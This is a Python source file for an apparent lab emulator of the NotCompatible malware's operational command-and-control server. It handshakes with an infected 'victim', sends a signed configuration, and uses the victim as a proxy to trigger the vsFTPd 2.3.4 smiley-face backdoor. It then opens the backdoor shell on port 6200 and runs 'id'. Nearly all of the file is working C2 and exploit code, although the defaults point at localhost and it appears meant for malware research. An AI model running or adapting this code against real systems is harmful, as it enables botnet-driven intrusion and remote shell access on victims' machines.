from __future__ import annotations

import argparse
import logging
import socket
import threading
import time
from pathlib import Path

from shared.configuration import build_signed_set
from shared.crypto import load_key
from shared.protocol import Packet, container, dword, ipv4, port, raw
from shared.session import EncryptedPacketSession, SessionClosed, server_handshake


LOG = logging.getLogger("c2")


def packet_channel(packet: Packet) -> int | None:
    child = packet.get("CH")
    return child.as_dword() if child is not None else None


def conn_packet(channel: int, host: str, target_port: int) -> Packet:
    return container(
        "CONN",
        dword("CH", channel),
        port("PORT", target_port),
        ipv4("IP", host),
    )


def send_packet(channel: int, data: bytes) -> Packet:
    return container("SEND", dword("CH", channel), raw("DT", data))


def shut_packet(channel: int) -> Packet:
    # RecvSHUT in the malware requires DT to exist, even though it ignores the value.
    return container("SHUT", dword("CH", channel), raw("DT", b""))


def wait_tag_channel(
    session: EncryptedPacketSession,
    tags: set[str],
    channel: int,
    timeout: float = 8,
) -> Packet:
    return session.wait_for(
        lambda packet: packet.tag in tags and packet_channel(packet) == channel,
        timeout,
    )


def wait_recv_contains(
    session: EncryptedPacketSession,
    channel: int,
    marker: bytes,
    timeout: float = 8,
) -> Packet:
    return session.wait_for(
        lambda packet: (
            packet.tag == "RECV"
            and packet_channel(packet) == channel
            and marker in packet.require("DT").data
        ),
        timeout,
    )


def run_exploitation(
    session: EncryptedPacketSession,
    args,
    global_private,
    stop: threading.Event,
) -> None:
    hello = session.wait_for(lambda packet: packet.tag == "HELO", timeout=10)
    LOG.info("Victim -> C2 HELO\n%s", hello.pretty(1))

    set_packet = build_signed_set(
        global_private,
        args.gw_host,
        args.gw_port,
        args.advertise_host,
        args.listen_port,
        args.lid,
    )
    session.send_packet(set_packet)
    LOG.info("C2 -> Victim SET LID=%d signed with laboratory RSAGlobal", args.lid)
    time.sleep(args.command_delay)

    session.send_packet(raw("PING"))
    LOG.info("C2 -> Victim PING")
    session.wait_for(lambda packet: packet.tag == "PONG", timeout=5)
    LOG.info("Victim -> C2 PONG")

    ftp_channel = 1
    session.send_packet(conn_packet(ftp_channel, args.target_host, args.ftp_port))
    LOG.info(
        "C2 -> Victim CONN CH=%d %s:%d",
        ftp_channel,
        args.target_host,
        args.ftp_port,
    )
    response = wait_tag_channel(session, {"CONN", "NOCN"}, ftp_channel)
    if response.tag != "CONN":
        raise RuntimeError("Victim could not connect to the FTP target")
    LOG.info("Victim -> C2 CONN acknowledgement for CH=%d", ftp_channel)

    banner = wait_recv_contains(session, ftp_channel, b"vsFTPd 2.3.4")
    LOG.info("Victim -> C2 FTP banner: %r", banner.require("DT").data)

    user_payload = b"USER lab:)\r\n"
    session.send_packet(send_packet(ftp_channel, user_payload))
    LOG.info("C2 -> Victim SEND CH=1 DT=%r [%s]", user_payload, user_payload.hex(" "))

    user_response = wait_recv_contains(session, ftp_channel, b"331")
    LOG.info("Victim -> C2 RECV CH=1 DT=%r", user_response.require("DT").data)

    pass_payload = b"PASS lab\r\n"
    session.send_packet(send_packet(ftp_channel, pass_payload))
    LOG.info("C2 -> Victim SEND CH=1 DT=%r [%s]", pass_payload, pass_payload.hex(" "))

    # The reference exploit does not rely on the PASS response. Leave time for TCP/6200.
    time.sleep(args.backdoor_delay)

    shell_channel = 2
    connected = False
    for attempt in range(1, args.shell_retries + 1):
        session.send_packet(conn_packet(shell_channel, args.target_host, args.shell_port))
        LOG.info(
            "C2 -> Victim CONN CH=%d %s:%d (attempt %d)",
            shell_channel,
            args.target_host,
            args.shell_port,
            attempt,
        )
        response = wait_tag_channel(session, {"CONN", "NOCN"}, shell_channel)
        if response.tag == "CONN":
            connected = True
            break
        time.sleep(args.backdoor_delay)
    if not connected:
        raise RuntimeError("Backdoor shell did not become reachable")
    LOG.info("Victim -> C2 CONN acknowledgement for CH=%d", shell_channel)

    proof_payload = b"id\n"
    session.send_packet(send_packet(shell_channel, proof_payload))
    LOG.info("C2 -> Victim SEND CH=2 DT=%r [%s]", proof_payload, proof_payload.hex(" "))

    proof = wait_recv_contains(session, shell_channel, b"uid=")
    LOG.info("Victim -> C2 exploitation proof: %r", proof.require("DT").data)

    session.send_packet(shut_packet(shell_channel))
    LOG.info("C2 -> Victim SHUT CH=2 with empty DT")
    wait_tag_channel(session, {"DISC"}, shell_channel)
    LOG.info("Victim -> C2 DISC CH=2")

    session.send_packet(shut_packet(ftp_channel))
    LOG.info("C2 -> Victim SHUT CH=1 with empty DT")
    wait_tag_channel(session, {"DISC"}, ftp_channel)
    LOG.info("Victim -> C2 DISC CH=1")
    LOG.info("LAB FLOW COMPLETED SUCCESSFULLY")

    while not stop.is_set():
        try:
            packets = session.receive_available(0.5)
            for packet in packets:
                LOG.info("Victim -> C2 %s", packet.tag)
        except SessionClosed:
            break


def handle_client(
    client: socket.socket,
    address,
    args,
    global_private,
    stop: threading.Event,
) -> None:
    peer = f"{address[0]}:{address[1]}"
    session = None
    try:
        LOG.info("%s connected", peer)
        session, _ = server_handshake(client, peer)
        LOG.info("%s RSA/RC4 handshake complete", peer)
        run_exploitation(session, args, global_private, stop)
    except (OSError, ValueError, TimeoutError, RuntimeError, SessionClosed) as exc:
        LOG.error("%s session failed: %s", peer, exc)
    finally:
        if session is not None:
            session.close()
        else:
            client.close()


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    parser = argparse.ArgumentParser(description="NotCompatible Operational C2 emulator")
    parser.add_argument("--listen-host", default="127.0.0.1")
    parser.add_argument("--listen-port", type=int, default=19443)
    parser.add_argument(
        "--advertise-host",
        default="127.0.0.1",
        help="Operational C2 IPv4 address placed in its signed SET",
    )
    parser.add_argument("--gw-host", default="127.0.0.1")
    parser.add_argument("--gw-port", type=int, default=18443)
    parser.add_argument("--lid", type=int, default=3)
    parser.add_argument("--command-delay", type=float, default=0.15)
    parser.add_argument("--target-host", default="127.0.0.1")
    parser.add_argument("--ftp-port", type=int, default=2121)
    parser.add_argument("--shell-port", type=int, default=6200)
    parser.add_argument("--backdoor-delay", type=float, default=0.25)
    parser.add_argument("--shell-retries", type=int, default=10)
    parser.add_argument(
        "--global-private",
        default=str(root / "keys" / "global_private.pem"),
    )
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [C2] %(message)s",
        datefmt="%H:%M:%S",
    )
    global_private = load_key(args.global_private)
    if not global_private.has_private():
        raise SystemExit("--global-private must contain an RSA private key")

    stop = threading.Event()
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.listen_host, args.listen_port))
    listener.listen()
    listener.settimeout(0.5)
    LOG.info("Listening on %s:%d (Ctrl+C to stop)", args.listen_host, args.listen_port)
    LOG.info(
        "Target configured as %s FTP=%d shell=%d",
        args.target_host,
        args.ftp_port,
        args.shell_port,
    )

    try:
        while not stop.is_set():
            try:
                client, address = listener.accept()
            except socket.timeout:
                continue
            threading.Thread(
                target=handle_client,
                args=(client, address, args, global_private, stop),
                daemon=True,
            ).start()
    except KeyboardInterrupt:
        LOG.info("Ctrl+C received, shutting down")
    finally:
        stop.set()
        listener.close()


if __name__ == "__main__":
    main()
